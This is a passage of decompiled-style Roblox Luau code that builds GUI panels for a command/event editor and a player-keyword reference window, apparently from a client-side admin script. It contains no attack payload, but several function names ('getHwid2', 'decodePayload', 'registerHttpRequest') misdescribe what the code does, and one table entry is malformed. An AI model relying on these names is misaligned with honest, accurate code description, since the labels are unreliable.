		BackgroundColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		BorderSizePixel = 0,
		Name = "CustomButton",
		Parent = { 30 },
		Position = UDim2.new(1, -25, 0, 42),
		Size = UDim2.new(0, 20, 0, 20),
		ZIndex = 10,
	}

	tbl87[1] = 36
	tbl87[2] = "Frame"
	tbl87[3] = tbl88
	local tbl89 = {}

	local tbl90 = {
		BackgroundColor3 = Color3.new(0.58823531866074, 0.58823531866074, 0.59215688705444),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "On",
		Parent = { 36 },
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 16, 0, 16),
		Text = "",
		TextColor3 = Color3.new(0, 0, 0),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl89[1] = 37
	tbl89[2] = "TextButton"
	tbl89[3] = tbl90
	local tbl91 = {}

	local tbl92 = {
		BackgroundColor3 = Color3.new(0.19607844948769, 0.19607844948769, 0.19607844948769),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		Name = "DelayEditor",
		Parent = { 18 },
		Position = UDim2.new(0, 0, 0, 25),
		Size = UDim2.new(1, 0, 0, 24),
		Visible = false,
		ZIndex = 10,
	}

	tbl91[1] = 38
	tbl91[2] = "Frame"
	tbl91[3] = tbl92
	local tbl93 = {}

	local tbl94 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		BorderSizePixel = 0,
		Font = 3,
		Name = "Secs",
		Parent = { 38 },
		PlaceholderColor3 = Color3.new(0.47058826684952, 0.47058826684952, 0.47058826684952),
		Position = UDim2.new(0, 60, 0, 2),
		Size = UDim2.new(1, -65, 0, 20),
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl93[1] = 39
	tbl93[2] = "TextBox"
	tbl93[3] = tbl94
	local tbl95 = {}

	local tbl96 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "Label",
		Parent = { 39 },
		Position = UDim2.new(0, -55, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "Delay (s):",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl95[1] = 40
	tbl95[2] = "TextLabel"
	tbl95[3] = tbl96
	local tbl97 = {}

	local tbl98 = {
		BackgroundColor3 = currentShade1,
		BorderSizePixel = 0,
		ClipsDescendants = true,
		Name = "EventTemplate",
		Parent = { 6 },
		Size = UDim2.new(1, 0, 0, 20),
		Visible = false,
		ZIndex = 10,
	}

	tbl97[1] = 41
	tbl97[2] = "Frame"
	tbl97[3] = tbl98
	local tbl99 = {}

	local tbl100 = {
		BackgroundColor3 = currentText1,
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Expand",
		Parent = { 41 },
		Size = UDim2.new(0, 20, 0, 20),
		Text = ">",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 18,
		ZIndex = 10,
	}

	tbl99[1] = 42
	tbl99[2] = "TextButton"
	tbl99[3] = tbl100
	local tbl101 = {}

	local tbl102 = {
		BackgroundColor3 = currentText1,
		BackgroundTransparency = 1,
		Font = 3,
		Name = "EventName",
		Parent = { 41 },
		Position = UDim2.new(0, 25, 0, 0),
		Size = UDim2.new(1, -25, 0, 20),
		Text = "OnSpawn",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl101[1] = 43
	tbl101[2] = "TextLabel"
	tbl101[3] = tbl102
	local tbl103 = {}

	local tbl104 = {
		BackgroundColor3 = Color3.new(0.19607844948769, 0.19607844948769, 0.19607844948769),
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		ClipsDescendants = true,
		Name = "Cmds",
		Parent = { 41 },
		Position = UDim2.new(0, 0, 0, 20),
		Size = UDim2.new(1, 0, 1, -20),
		ZIndex = 10,
	}

	tbl103[1] = 44
	tbl103[2] = "Frame"
	tbl103[3] = tbl104
	local tbl105 = {}

	local tbl106 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BorderColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		Name = "Add",
		Parent = { 44 },
		Position = UDim2.new(0, 0, 1, -20),
		Size = UDim2.new(1, 0, 0, 20),
		ZIndex = 10,
	}

	tbl105[1] = 45
	tbl105[2] = "Frame"
	tbl105[3] = tbl106
	local tbl107 = {}

	local tbl108 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		ClearTextOnFocus = false,
		Font = 3,
		Parent = { 45 },
		PlaceholderColor3 = Color3.new(0.7843137383461, 0.7843137383461, 0.7843137383461),
		PlaceholderText = "Add new command",
		Position = UDim2.new(0, 5, 0, 0),
		Size = UDim2.new(1, -10, 1, 0),
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl107[1] = 46
	tbl107[2] = "TextBox"
	tbl107[3] = tbl108
	local tbl109 = {}

	local tbl110 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Name = "Holder",
		Parent = { 44 },
		Size = UDim2.new(1, 0, 1, -20),
		ZIndex = 10,
	}

	tbl109[1] = 47
	tbl109[2] = "Frame"
	tbl109[3] = tbl110
	local tbl111 = {}

	local tbl112 = {
		currentShade1,
		BorderSizePixel = 0,
		ClipsDescendants = true,
		Name = "CmdTemplate",
		Parent = { 6 },
		Size = UDim2.new(1, 0, 0, 20),
		Visible = false,
		ZIndex = 10,
	}

	tbl111[1] = 49
	tbl111[2] = "Frame"
	tbl111[3] = tbl112
	local tbl113 = {}

	local tbl114 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		ClearTextOnFocus = false,
		Font = 3,
		Parent = { 49 },
		PlaceholderColor3 = Color3.new(1, 1, 1),
		Position = UDim2.new(0, 5, 0, 0),
		Size = UDim2.new(1, -45, 0, 20),
		Text = "a\\b\\c\\d",
		TextColor3 = currentText1,
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl113[1] = 50
	tbl113[2] = "TextBox"
	tbl113[3] = tbl114
	local tbl115 = {}

	local tbl116 = {
		BackgroundColor3 = currentShade1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "Delete",
		Parent = { 49 },
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		Text = "X",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 18,
		ZIndex = 10,
	}

	tbl115[1] = 51
	tbl115[2] = "TextButton"
	tbl115[3] = tbl116
	local tbl117 = {}

	local tbl118 = {
		BackgroundColor3 = currentShade1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "Settings",
		Parent = { 49 },
		Position = UDim2.new(1, -40, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 18,
		ZIndex = 10,
	}

	tbl117[1] = 52
	tbl117[2] = "TextButton"
	tbl117[3] = tbl118
	local tbl119 = {}

	local tbl120 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Image = "rbxassetid://1204397029",
		Parent = { 52 },
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 16, 0, 16),
		ZIndex = 10,
	}

	tbl119[1] = 53
	tbl119[2] = "ImageLabel"
	tbl119[3] = tbl120
	tbl6[1] = tbl7
	tbl6[2] = tbl9
	tbl6[3] = tbl11
	tbl6[4] = tbl13
	tbl6[5] = tbl15
	tbl6[6] = tbl17
	tbl6[7] = tbl19
	tbl6[8] = tbl21
	tbl6[9] = { 9, "UIListLayout", { Parent = { 8 }, SortOrder = 2 } }
	tbl6[10] = tbl23
	tbl6[11] = tbl25
	tbl6[12] = tbl27
	tbl6[13] = tbl29
	tbl6[14] = tbl31
	tbl6[15] = { 15, "UIListLayout", { Parent = { 14 }, SortOrder = 2 } }
	tbl6[16] = tbl33
	tbl6[17] = tbl35
	tbl6[18] = { 18, "Folder", { Name = "Templates", Parent = { 10 } } }
	tbl6[19] = tbl37
	tbl6[20] = tbl39
	tbl6[21] = tbl41
	tbl6[22] = tbl43
	tbl6[23] = tbl45
	tbl6[24] = tbl47
	tbl6[25] = tbl49
	tbl6[26] = tbl51
	tbl6[27] = tbl53
	tbl6[28] = tbl55
	tbl6[29] = tbl57
	tbl6[30] = tbl59
	tbl6[31] = tbl61
	tbl6[32] = tbl63
	tbl6[33] = tbl65
	tbl6[34] = tbl67
	tbl6[35] = tbl69
	tbl6[36] = tbl71
	tbl6[37] = tbl73
	tbl6[38] = tbl75
	tbl6[39] = tbl77
	tbl6[40] = tbl79
	tbl6[41] = tbl81
	tbl6[42] = tbl83
	tbl6[43] = tbl85
	tbl6[44] = tbl87
	tbl6[45] = tbl89
	tbl6[46] = tbl91
	tbl6[47] = tbl93
	tbl6[48] = tbl95
	tbl6[49] = tbl97
	tbl6[50] = tbl99
	tbl6[51] = tbl101
	tbl6[52] = tbl103
	tbl6[53] = tbl105
	tbl6[54] = tbl107
	tbl6[55] = tbl109
	tbl6[56] = { 48, "UIListLayout", { Parent = { 47 }, SortOrder = 2 } }
	tbl6[57] = tbl111
	tbl6[58] = tbl113
	tbl6[59] = tbl115
	tbl6[60] = tbl117
	tbl6[61] = tbl119
	local v2 = _create(tbl6)
	v2.Name = randomString()
	local content = v2:WaitForChild("Content")
	local list = content:WaitForChild("List")
	local holder = list:WaitForChild("Holder")
	local cmdTemplate = content:WaitForChild("CmdTemplate")
	local eventTemplate = content:WaitForChild("EventTemplate")
	local slider = content:WaitForChild("Settings"):WaitForChild("Slider")
	local templates = content.Settings:WaitForChild("Templates")
	local holder2 = slider:WaitForChild("List"):WaitForChild("Holder")
	table.insert(shade2, v2.TopBar)
	table.insert(shade1, content)
	table.insert(shade2, eventTemplate)
	table.insert(text1, eventTemplate.EventName)
	table.insert(shade1, eventTemplate.Cmds.Add)
	table.insert(shade1, cmdTemplate)
	table.insert(text1, cmdTemplate.TextBox)
	table.insert(shade2, cmdTemplate.Delete)
	table.insert(shade2, cmdTemplate.Settings)
	table.insert(scroll, content.List)
	table.insert(shade1, slider)
	table.insert(shade2, slider.Line)
	table.insert(shade2, slider.Close)
	table.insert(scroll, slider.List)
	table.insert(shade2, templates.DelayEditor.Secs)
	table.insert(text1, templates.DelayEditor.Secs)
	table.insert(text1, templates.DelayEditor.Secs.Label)
	table.insert(text1, templates.Players.Title)
	table.insert(shade3, templates.Players.CustomButton)
	table.insert(shade2, templates.Players.Custom)
	table.insert(text1, templates.Players.Custom)
	table.insert(shade3, templates.Players.Any.Button)
	table.insert(shade3, templates.Players.Me.Button)
	table.insert(text1, templates.Players.Any)
	table.insert(text1, templates.Players.Me)
	table.insert(text1, templates.Strings.Title)
	table.insert(text1, templates.Strings.Any)
	table.insert(shade3, templates.Strings.Any.Button)
	table.insert(shade3, templates.Strings.CustomButton)
	table.insert(text1, templates.Strings.Custom)
	table.insert(shade2, templates.Strings.Custom)
	table.insert(text1, templates.Players.Me)
	table.insert(text1, templates.Numbers.Title)
	table.insert(text1, templates.Numbers.Any)
	table.insert(shade3, templates.Numbers.Any.Button)
	table.insert(shade3, templates.Numbers.CustomButton)
	table.insert(text1, templates.Numbers.Custom)
	table.insert(shade2, templates.Numbers.Custom)
	local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
	local v3 = nil

	slider:WaitForChild("Close").MouseButton1Click:Connect(function()
		local out = Enum.EasingDirection.Out
		local quart = Enum.EasingStyle.Quart
		slider:TweenPosition(UDim2.new(0, -150, 0, 0), out, quart, 0.25, true)
	end)

	local function fn4()
		local n = 0

		for _, child in pairs(holder:GetChildren()) do
			if child.Name == "EventTemplate" then
				n += 20

				if child.Expand.Rotation == 90 then
					n += 20 * (1 + (#tbl5[child.EventName:GetAttribute("RawName")].commands or 0))
				end
			end
		end

		TweenService:Create(list, tweenInfo, { CanvasSize = UDim2.new(0, 0, 0, n) }):Play()

		if list.AbsoluteSize.Y < n then
			holder.Size = UDim2.new(1, -8, 1, 0)
		else
			holder.Size = UDim2.new(1, 0, 1, 0)
		end
	end

	local function fn5()
		local n = 0

		for _, child in pairs(holder2:GetChildren()) do
			if child:IsA("Frame") then
				n += child.AbsoluteSize.Y
			end
		end

		holder2.Parent.CanvasSize = UDim2.new(0, 0, 0, n)

		if n > holder2.Parent.AbsoluteSize.Y then
			holder2.Size = UDim2.new(1, -8, 1, 0)
		else
			holder2.Size = UDim2.new(1, 0, 1, 0)
		end
	end

	local function fn6(arg, arg2)
		local flag2 = arg.On.BackgroundTransparency == 0

		local function fn7()
			arg.On.BackgroundTransparency = flag2 and 0 or 1
		end

		arg.On.MouseButton1Click:Connect(function()
			flag2 = not flag2
			fn7()

			if arg2 then
				arg2(flag2)
			end
		end)

		return {
			Toggle = function(arg3)
				flag2 = not flag2
				fn7()

				if not arg3 and arg2 then
					arg2(flag2)
				end
			end,
			Enable = function(arg3)
				if flag2 then
					return
				end
				flag2 = true
				fn7()

				if not arg3 and arg2 then
					arg2(flag2)
				end
			end,
			Disable = function(arg3)
				if not flag2 then
					return
				end
				flag2 = false
				fn7()

				if not arg3 and arg2 then
					arg2(flag2)
				end
			end,
			IsEnabled = function()
				return flag2
			end,
		}
	end

	local function importLib(lib, members)
		v3 = members

		for _, child in pairs(holder2:GetChildren()) do
			if child:IsA("Frame") then
				child:Destroy()
			end
		end

		local clone = templates.DelayEditor:Clone()

		clone.Secs.FocusLost:Connect(function()
			members[3] = tonumber(clone.Secs.Text) or 0
			clone.Secs.Text = members[3]

			if v then
				v()
			end
		end)

		clone.Secs.Text = members[3]
		clone.Visible = true
		table.insert(shade2, clone.Secs)
		table.insert(text1, clone.Secs)
		table.insert(text1, clone.Secs.Label)
		clone.Parent = holder2

		for k, set in pairs(lib.sets) do
			if set.Type == "Player" then
				local clone2 = templates.Players:Clone()
				clone2.Title.Text = set.Name or "Player"
				local v4 = nil
				local v5 = nil

				local v6 = fn6(clone2.Me.Button, function(arg)
					if not arg then
						return
					end
					v4.Disable()
					v5.Disable()
					members[2][k] = 0

					if v then
						v()
					end
				end)

				v4 = fn6(clone2.Any.Button, function(arg)
					if not arg then
						return
					end
					v6.Disable()
					v5.Disable()
					members[2][k] = 1

					if v then
						v()
					end
				end)

				local custom = clone2.Custom

				v5 = fn6(clone2.CustomButton, function(arg)
					if not arg then
						return
					end
					v6.Disable()
					v4.Disable()
					members[2][k] = custom.Text

					if v then
						v()
					end
				end)

				ViewportTextBox.convert(custom)

				custom.FocusLost:Connect(function()
					if v5:IsEnabled() then
						members[2][k] = custom.Text

						if v then
							v()
						end
					end
				end)

				local v7 = members[2][k]

				if v7 == 0 then
					v6:Enable()
				elseif v7 == 1 then
					v4:Enable()
				else
					v5:Enable()
					custom.Text = v7
				end

				clone2.Visible = true
				table.insert(text1, clone2.Title)
				table.insert(shade3, clone2.CustomButton)
				table.insert(shade3, clone2.Any.Button)
				table.insert(shade3, clone2.Me.Button)
				table.insert(text1, clone2.Any)
				table.insert(text1, clone2.Me)
				clone2.Parent = holder2
			elseif set.Type == "String" then
				local clone2 = templates.Strings:Clone()
				clone2.Title.Text = set.Name or "String"
				local v4 = nil

				local v5 = fn6(clone2.Any.Button, function(arg)
					if not arg then
						return
					end
					v4.Disable()
					members[2][k] = 0

					if v then
						v()
					end
				end)

				local custom = clone2.Custom

				v4 = fn6(clone2.CustomButton, function(arg)
					if not arg then
						return
					end
					v5.Disable()
					members[2][k] = custom.Text

					if v then
						v()
					end
				end)

				ViewportTextBox.convert(custom)

				custom.FocusLost:Connect(function()
					if v4:IsEnabled() then
						members[2][k] = custom.Text

						if v then
							v()
						end
					end
				end)

				local v6 = members[2][k]

				if v6 == 0 then
					v5:Enable()
				else
					v4:Enable()
					custom.Text = v6
				end

				clone2.Visible = true
				table.insert(text1, clone2.Title)
				table.insert(text1, clone2.Any)
				table.insert(shade3, clone2.Any.Button)
				table.insert(shade3, clone2.CustomButton)
				clone2.Parent = holder2
			elseif set.Type == "Number" then
				local clone2 = templates.Numbers:Clone()
				clone2.Title.Text = set.Name or "Number"
				local v4 = nil

				local v5 = fn6(clone2.Any.Button, function(arg)
					if not arg then
						return
					end
					v4.Disable()
					members[2][k] = 0

					if v then
						v()
					end
				end)

				local custom = clone2.Custom

				v4 = fn6(clone2.CustomButton, function(arg)
					if not arg then
						return
					end
					v5.Disable()
					members[2][k] = custom.Text

					if v then
						v()
					end
				end)

				ViewportTextBox.convert(custom)

				custom.FocusLost:Connect(function()
					members[2][k] = tonumber(custom.Text) or 0
					custom.Text = members[2][k]

					if v4:IsEnabled() then
						if v then
							v()
						end
					end
				end)

				local v6 = members[2][k]

				if v6 == 0 then
					v5:Enable()
				else
					v4:Enable()
					custom.Text = v6
				end

				clone2.Visible = true
				table.insert(text1, clone2.Title)
				table.insert(text1, clone2.Any)
				table.insert(shade3, clone2.Any.Button)
				table.insert(shade3, clone2.CustomButton)
				clone2.Parent = holder2
			end
		end

		fn5()
		local out = Enum.EasingDirection.Out
		local quart = Enum.EasingStyle.Quart
		slider:TweenPosition(UDim2.new(0, 0, 0, 0), out, quart, 0.25, true)
	end

	local function fn7(arg)
		local tbl121 = {}

		for _, set in pairs(arg.sets) do
			if set.Type == "Player" then
				tbl121[#tbl121 + 1] = set.Default or 0
			elseif set.Type == "String" then
				tbl121[#tbl121 + 1] = set.Default or 0
			elseif set.Type == "Number" then
				tbl121[#tbl121 + 1] = set.Default or 0
			end
		end

		return tbl121
	end

	local function fn8()
		for _, child in pairs(holder:GetChildren()) do
			if child:IsA("Frame") then
				child:Destroy()
			end
		end

		for k, v4 in pairs(tbl5) do
			local clone = eventTemplate:Clone()
			clone.EventName.Text = k
			clone.Visible = true
			clone.EventName:SetAttribute("RawName", k)
			table.insert(shade2, clone)
			table.insert(text1, clone.EventName)
			table.insert(shade1, clone.Cmds.Add)
			local flag2 = false

			clone.Expand.MouseButton1Down:Connect(function()
				flag2 = not flag2
				local v5 = clone
				local tweenSize = v5.TweenSize
				local udim2 = UDim2.new
				local n = flag2 and 20 * #clone.Cmds.Holder:GetChildren() or 0
				local out = Enum.EasingDirection.Out
				local quart = Enum.EasingStyle.Quart
				tweenSize(v5, udim2(1, 0, 0, 20 + n), out, quart, 0.25, true)
				clone.Expand.Rotation = flag2 and 90 or 0
				fn4()
			end)

			local fn9 = nil

			fn9 = function()
				for _, child in pairs(clone.Cmds.Holder:GetChildren()) do
					if child.Name == "CmdTemplate" then
						child:Destroy()
					end
				end

				clone.EventName.Text = k .. (#v4.commands > 0 and " (" .. #v4.commands .. ")" or "")

				for k2, command in pairs(v4.commands) do
					local clone2 = cmdTemplate:Clone()
					local textBox = clone2.TextBox
					ViewportTextBox.convert(textBox)
					textBox.Text = command[1]
					clone2.Visible = true
					table.insert(shade1, clone2)
					table.insert(shade2, clone2.Delete)
					table.insert(shade2, clone2.Settings)

					textBox.FocusLost:Connect(function()
						v4.commands[k2] = { textBox.Text, command[2], command[3] }

						if v then
							v()
						end
					end)

					clone2.Settings.MouseButton1Click:Connect(function()
						importLib(v4, command)
					end)

					clone2.Delete.MouseButton1Click:Connect(function()
						table.remove(v4.commands, k2)
						fn9()
						fn4()

						if v3 == command then
							local out = Enum.EasingDirection.Out
							local quart = Enum.EasingStyle.Quart
							slider:TweenPosition(UDim2.new(0, -150, 0, 0), out, quart, 0.25, true)
						end

						if v then
							v()
						end
					end)

					clone2.Parent = clone.Cmds.Holder
				end

				local v5 = clone
				local tweenSize = v5.TweenSize
				local udim2 = UDim2.new
				local n = flag2 and 20 * #clone.Cmds.Holder:GetChildren() or 0
				local out = Enum.EasingDirection.Out
				local quart = Enum.EasingStyle.Quart
				tweenSize(v5, udim2(1, 0, 0, 20 + n), out, quart, 0.25, true)
			end

			local textBox = clone.Cmds.Add.TextBox
			ViewportTextBox.convert(textBox)

			textBox.FocusLost:Connect(function(enterPressed)
				if enterPressed then
					local commands = v4.commands
					local n = #v4.commands + 1
					local tbl121 = {}
					local text = textBox.Text
					local v5 = fn7(v4)
					tbl121[1] = text
					tbl121[2] = v5
					tbl121[3] = 0
					commands[n] = tbl121
					textBox.Text = ""
					fn9()
					fn4()

					if v then
						v()
					end
				end
			end)

			clone.Parent = holder
			fn9()
		end

		fn4()
	end

	local function fn9()
		local tbl121 = {}

		for k, v4 in pairs(tbl5) do
			tbl121[k] = v4.commands
		end

		return HttpService:JSONEncode(tbl121)
	end

	local function fn10(arg)
		local data = HttpService:JSONDecode(arg)

		for k, v4 in pairs(data) do
			if tbl5[k] then
				tbl5[k].commands = v4
			end
		end
	end

	local function fn11(arg, arg2)
		table.insert(tbl5[arg].commands, arg2)
	end

	local function registerHttpRequest(fn12)
		if type(fn12) == "function" then
			v = fn12
		end
	end

	v2.TopBar.Close.MouseButton1Click:Connect(function()
		v2:TweenPosition(UDim2.new(0.5, -175, 0, -500), "InOut", "Quart", 0.5, true, nil)
	end)

	dragGUI(v2)
	v2.Parent = PARENT

	return {
		RegisterEvent = fn2,
		FireEvent = fn3,
		Refresh = fn8,
		SaveData = fn9,
		LoadData = fn10,
		AddCmd = fn11,
		Frame = v2,
		SetOnEdited = registerHttpRequest,
	}
end

eventEditor = getHwid2()

local function decodePayload()
	local _create
	_create = create
	local tbl5
	tbl5 = {}
	local tbl6
	tbl6 = {}

	local tbl7 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		BorderSizePixel = 0,
		Name = "Main",
		Position = UDim2.new(0.5, -250, 0, -500),
		Size = UDim2.new(0, 500, 0, 20),
		ZIndex = 10,
	}

	tbl6[1] = 1
	tbl6[2] = "Frame"
	tbl6[3] = tbl7
	local tbl8
	tbl8 = {}

	local tbl9 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BorderSizePixel = 0,
		Name = "TopBar",
		Parent = { 1 },
		Size = UDim2.new(1, 0, 0, 20),
		ZIndex = 10,
	}

	tbl8[1] = 2
	tbl8[2] = "Frame"
	tbl8[3] = tbl9
	local tbl10
	tbl10 = {}

	local tbl11 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Title",
		Parent = { 2 },
		Size = UDim2.new(1, 0, 0.94999998807907, 0),
		Text = "Reference",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl10[1] = 3
	tbl10[2] = "TextLabel"
	tbl10[3] = tbl11
	local tbl12
	tbl12 = {}

	local tbl13 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Close",
		Parent = { 2 },
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl12[1] = 4
	tbl12[2] = "TextButton"
	tbl12[3] = tbl13
	local tbl14
	tbl14 = {}

	local tbl15 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Image = "rbxassetid://5054663650",
		Parent = { 4 },
		Position = UDim2.new(0, 5, 0, 5),
		Size = UDim2.new(0, 10, 0, 10),
		ZIndex = 10,
	}

	tbl14[1] = 5
	tbl14[2] = "ImageLabel"
	tbl14[3] = tbl15
	local tbl16
	tbl16 = {}

	local tbl17 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BorderSizePixel = 0,
		Name = "Content",
		Parent = { 1 },
		Position = UDim2.new(0, 0, 0, 20),
		Size = UDim2.new(1, 0, 0, 300),
		ZIndex = 10,
	}

	tbl16[1] = 6
	tbl16[2] = "Frame"
	tbl16[3] = tbl17
	local tbl18
	tbl18 = {}

	local tbl19 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		BorderSizePixel = 0,
		BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
		CanvasSize = UDim2.new(0, 0, 0, 1313),
		Name = "List",
		Parent = { 6 },
		ScrollBarImageColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		ScrollBarThickness = 8,
		Size = UDim2.new(1, 0, 1, 0),
		TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
		VerticalScrollBarInset = 2,
		ZIndex = 10,
	}

	tbl18[1] = 7
	tbl18[2] = "ScrollingFrame"
	tbl18[3] = tbl19
	local tbl20
	tbl20 = {}

	local tbl21 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Name = "Section",
		Parent = { 7 },
		Size = UDim2.new(1, 0, 0, 429),
		ZIndex = 10,
	}

	tbl20[1] = 9
	tbl20[2] = "Frame"
	tbl20[3] = tbl21
	local tbl22
	tbl22 = {}

	local tbl23 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "Header",
		Parent = { 9 },
		Position = UDim2.new(0, 8, 0, 5),
		Size = UDim2.new(1, -8, 0, 20),
		Text = "Special Player Cases",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 20,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl22[1] = 10
	tbl22[2] = "TextLabel"
	tbl22[3] = tbl23
	local tbl24
	tbl24 = {}

	local tbl25 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Text",
		Parent = { 9 },
		Position = UDim2.new(0, 8, 0, 25),
		Size = UDim2.new(1, -8, 0, 20),
		Text = "These keywords can be used to quickly select groups of players in commands:",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl24[1] = 11
	tbl24[2] = "TextLabel"
	tbl24[3] = tbl25
	local tbl26
	tbl26 = {}

	local tbl27 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BorderSizePixel = 0,
		Name = "Line",
		Parent = { 9 },
		Position = UDim2.new(0, 10, 1, -1),
		Size = UDim2.new(1, -20, 0, 1),
		ZIndex = 10,
	}

	tbl26[1] = 12
	tbl26[2] = "Frame"
	tbl26[3] = tbl27
	local tbl28
	tbl28 = {}

	local tbl29 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "Cases",
		Parent = { 9 },
		Position = UDim2.new(0, 8, 0, 55),
		Size = UDim2.new(1, -16, 0, 342),
		ZIndex = 10,
	}

	tbl28[1] = 13
	tbl28[2] = "Frame"
	tbl28[3] = tbl29
	local tbl30
	tbl30 = {}

	local tbl31 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = -4,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl30[1] = 15
	tbl30[2] = "Frame"
	tbl30[3] = tbl31
	local tbl32
	tbl32 = {}

	local tbl33 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 15 },
		Size = UDim2.new(1, 0, 1, 0),
		Text = "all",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl32[1] = 16
	tbl32[2] = "TextLabel"
	tbl32[3] = tbl33
	local tbl34
	tbl34 = {}

	local tbl35 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "CaseDesc",
		Parent = { 15 },
		Position = UDim2.new(0, 15, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		Text = "- includes everyone",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl34[1] = 17
	tbl34[2] = "TextLabel"
	tbl34[3] = tbl35
	local tbl36
	tbl36 = {}

	local tbl37 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = -3,
		Name = "Case",
		Parent = { 13 },
		Position = UDim2.new(0, 8, 0, 60),
		Size = UDim2.new(1, 0, 0, 18),
		ZIndex = 10,
	}

	tbl36[1] = 18
	tbl36[2] = "Frame"
	tbl36[3] = tbl37
	local tbl38
	tbl38 = {}

	local tbl39 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 4,
		Name = "CaseName",
		Parent = { 18 },
		Size = UDim2.new(1, 0, 1, 0),
